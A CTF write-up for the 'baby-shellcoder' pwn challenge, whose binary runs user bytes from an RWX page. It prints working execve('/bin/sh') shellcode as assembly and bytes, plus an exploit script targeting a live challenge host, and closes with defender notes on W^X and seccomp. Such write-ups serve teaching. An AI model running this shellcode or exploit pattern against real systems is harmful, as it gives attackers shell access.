<!-- writeup by Abdelkader -->
<!-- standalone repo: https://github.com/Abdelkad3r/hasblctf-2026/tree/main/pwn/baby-shellcoder -->
<!-- (full solve.py and handout/ live there) -->

# baby-shellcoder (pwn)

| Field    | Value                                                          |
| -------- | -------------------------------------------------------------- |
| Category | pwn                                                            |
| Target   | `nc 34.77.68.154 10002` — Linux x86-64 PIE ELF, not stripped   |
| Flag     | `HASBL{K3PT_Y0U_W41T1NG_HUH}`                                  |

## Description

> Baby's first shellcode

The binary builds you the runway. It hands you a 64-byte RWX page,
prompts "Kept you waiting huh?", reads your 64 bytes into the page,
**calls into it**, and then unmaps it. No filter, no canary, no
sandbox. The first 64 bytes you send are executed as raw x86-64 code.

So this is one of those rare cases where there's no exploit to *find*
— only one to *write*. The standard 26-byte `execve("/bin/sh")` fits
with room to spare; the service's stdin/stdout are already the socket
so the shell pops live, and `cat flag.txt` finishes the job.

## TL;DR

```c
int main(void) {
    void *addr = mmap(NULL, 0x40,
                      PROT_READ|PROT_WRITE|PROT_EXEC,   // 7
                      MAP_PRIVATE|MAP_ANONYMOUS,        // 0x22
                      -1, 0);
    if (addr == MAP_FAILED) { perror("mmap failed: "); return -1; }
    puts("Kept you waiting huh?");
    read(0, addr, 0x40);
    ((void(*)())addr)();        // ← user's 64 bytes run as code
    munmap(addr, 0x40);
    return 0;
}
```

Send 26 bytes of `execve("/bin/sh")` shellcode, NOP-pad to 64, type
`cat flag.txt`. Done.

```
$ ./solve.py
HASBL{K3PT_Y0U_W41T1NG_HUH}
```

## Recon

```
$ file main
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ readelf -l main | grep -E 'STACK|LOAD'
LOAD     0x00000000 R    ...
LOAD     0x00001000 RE   .text
LOAD     0x00002000 R    .rodata
LOAD     0x00003dd0 RW   .data + .bss
GNU_STACK 0x00000000 RW  0x0    ← NX is on
```

NX is on, but main `mmap`s with `prot = 7 = PROT_R|W|X`, so the page
that runs our code is RWX regardless. Even if the stack is locked
down, the binary opens its own door.

### `main` in r2 (annotated)

```nasm
sub  rsp, 0x10
mov  r9d, 0                ; offset
mov  r8d, -1               ; fd
mov  ecx, 0x22             ; MAP_PRIVATE | MAP_ANONYMOUS
mov  edx, 7                ; PROT_READ | PROT_WRITE | PROT_EXEC
mov  esi, 0x40             ; length = 64
mov  edi, 0                ; addr = NULL
call mmap@plt
mov  [rbp-8], rax          ; save page address
cmp  qword [rbp-8], -1
je   .mmap_failed

lea  rdi, "Kept you waiting huh?"
call puts@plt

mov  rax, [rbp-8]
mov  edx, 0x40             ; nbyte = 64
mov  rsi, rax              ; buf = addr
mov  edi, 0                ; fildes = STDIN
call read@plt

mov  rdx, [rbp-8]
xor  eax, eax              ; (clear AL for variadic ABI; irrelevant here)
call rdx                   ; ← jumps into our 64 bytes
```

The four constants on `mmap` are the giveaway: `prot=7` is the only
value that matters. The `call rdx` is the launch ramp.

### How much space do we have, and what shape?

`0x40 = 64` bytes. The CPU starts at offset 0 (the first byte we
write), and there is no register setup required for shellcode — every
register is arbitrary at entry. Importantly:

* No bad-byte filter (`read` accepts NULs, control characters,
  whatever).
* No alignment constraint that's our problem (`mmap` gives a
  page-aligned address; the rest is on us, but for `syscall` we don't
  care).
* `stdin`/`stdout`/`stderr` of the binary are connected to the socket
  by the wrapper (socat-style). So once we `execve` something, the
  child inherits the same fds and we talk to it directly.

## Shellcode

26 bytes of execve("/bin/sh", NULL, NULL):

```nasm
xor    rsi, rsi                       ; envp = NULL
push   rsi                            ; '\0' to terminate "/bin/sh"
movabs rdi, 0x0068732f6e69622f        ; "/bin/sh\0"
push   rdi
mov    rdi, rsp                       ; rdi → "/bin/sh" on stack
xor    rdx, rdx                       ; argv = NULL
push   0x3b
pop    rax                            ; rax = 59 = __NR_execve
syscall
```

Byte sequence (26 B):

```
48 31 F6                            xor rsi, rsi
56                                  push rsi
48 BF 2F 62 69 6E 2F 73 68 00       movabs rdi, "/bin/sh\0"
57                                  push rdi
48 89 E7                            mov rdi, rsp
48 31 D2                            xor rdx, rdx
6A 3B                               push 0x3b
58                                  pop rax
0F 05                               syscall
```

Pad with `\x90` to 64 bytes. The `0x00` byte inside the `movabs`
immediate (the `'\0'` terminator of `/bin/sh`) is fine — `read(2)`
doesn't interpret NULs. The only place this would matter is if the
binary had used `fgets`, `gets`, or `scanf("%s")`.

### Why we can use a stack-style shellcode here

The mmap'd page is RWX, and `rsp` is the *original* stack (still RW
but not exec). We're free to `push` onto the original stack; we just
mustn't try to *execute* off it. All execution happens inside the RWX
page; the stack is used only as scratch for the syscall args.

## Exploit

```python
sc = (
    b"\x48\x31\xf6"                                     # xor rsi, rsi
    b"\x56"                                             # push rsi
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00"         # movabs rdi, "/bin/sh\0"
    b"\x57"                                             # push rdi
    b"\x48\x89\xe7"                                     # mov rdi, rsp
    b"\x48\x31\xd2"                                     # xor rdx, rdx
    b"\x6a\x3b"                                         # push 0x3b
    b"\x58"                                             # pop rax
    b"\x0f\x05"                                         # syscall
)
payload = sc + b"\x90" * (0x40 - len(sc))

io = remote("34.77.68.154", 10002)
io.recvuntil(b"huh?\n")
io.send(payload)                     # 64 bytes consumed by `read`, then call rdx
io.sendline(b"cat flag.txt")         # we're talking to /bin/sh now
print(io.recv(timeout=2).decode())
```

End-to-end:

```
[+] banner: b'Kept you waiting huh?\n'
HASBL{K3PT_Y0U_W41T1NG_HUH}
```

## Flag

```
HASBL{K3PT_Y0U_W41T1NG_HUH}
```

The greeting string and the flag are the same joke — Solid Snake's
"Kept you waiting, huh?" from Metal Gear, repurposed.

## Defender notes

* **`mmap(PROT_EXEC)` is the same primitive you spend ASLR + NX +
  RELRO + canaries to *prevent*.** Every JIT (V8, .NET, LuaJIT,
  Cranelift) has to manage exactly this hazard with W^X policies and
  thread-local code caches. Doing it in your `main()` with no
  filtering is a CTF teaching aid and nothing else; in production,
  always pair RWX with one of (a) signing/verification, (b) immediate
  `mprotect(RX)` after writing, (c) a `seccomp` jail.
* **`seccomp-bpf` would have killed `execve` on a one-liner.** The
  simplest hardening for "you get to run code" challenges is
  `prctl(PR_SET_NO_NEW_PRIVS)` + a tiny seccomp filter that whitelists
  `read`/`write`/`open`/`openat`/`close`/`exit_group` (and arguably
  `fstat`). That changes the challenge from "spawn a shell" to "use
  the open/read syscalls directly," which is a much more interesting
  exercise.
* **`read` of exactly the buffer size is fine here, but generally
  not.** `read(0, addr, 0x40)` will accept anywhere between 1 and 64
  bytes; the trailing un-overwritten bytes are whatever `mmap`
  zero-initialised them to (which is `0x00 0x00 0x00 ...` —
  conveniently `add [rax], al` over and over, which crashes
  eventually). If you ever want to give a *fixed-size* shellcode
  buffer, prefer `read_full(fd, buf, n)` or document the smaller
  ABI.
* **`call rdx` is fine; `jmp rdx` would be friendlier.** A direct
  `jmp` would preserve more attacker-controlled register state if the
  shellcode wanted it. As written, `call` clobbers `rax` (zeroed by
  the `xor eax, eax` immediately before), pushes a return address onto
  the stack (so the shellcode's `rsp` is 8 off a 16-byte boundary at
  entry), and turns the snippet into a function the unhappy attacker
  has to `ret` cleanly from if they want `munmap` to run. None of
  this matters for `execve`-then-shell, but it would matter for, say,
  a ROP-after-shellcode challenge.

## Files

* [`solve.py`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/pwn/baby-shellcoder/solve.py) — argparse-driven solver. Defaults to the
  live remote; standard library only (no pwntools dep).
* [`handout/main`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/pwn/baby-shellcoder/handout/main) — original ELF.

## Requirements

Python 3.9+; standard library only.
